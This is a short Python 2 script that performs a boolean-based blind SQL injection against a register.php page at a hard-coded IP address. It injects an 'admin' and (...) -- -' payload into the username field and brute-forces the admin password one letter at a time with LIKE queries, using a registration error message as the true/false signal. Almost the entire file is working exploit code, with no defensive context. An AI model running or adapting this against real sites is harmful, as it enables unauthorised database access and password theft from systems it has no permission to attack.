import requests
import sys

BASEURL = "http://130.221.105.251/register.php"  # Input the URL running the .php file that connects to db

SESSION = requests.Session()

TRUE = "Someone already has registered"
def postURL(url, data):
	return SESSION.post(format(url), data).text

def evaluateCondition(cond):
	payload = "admin' and (%s) -- -" % cond  # Does this SQL format look familar?
	response = postURL(BASEURL, {"username" : payload})

	#print response
	return TRUE in response

def exploitSQL(): # Loops SQL injection 'password LIKE y%' until password is found!
	password = ""
	alphabet = "abcdefghijklmnopqrstuvwxyz"

	query = "password LIKE "
	passthrough = False
	while(passthrough == False):
		for i in alphabet:
			format = "'" + password + i + "%" + "'"
			query += format
			if evaluateCondition(query):
				password += i
				print True;
				query = "password LIKE "
				break;
			else:
				query = "password LIKE "
			if i == alphabet[-1]:
				passthrough = True
	return password
	
print evaluateCondition(sys.argv[1])
print exploitSQL()
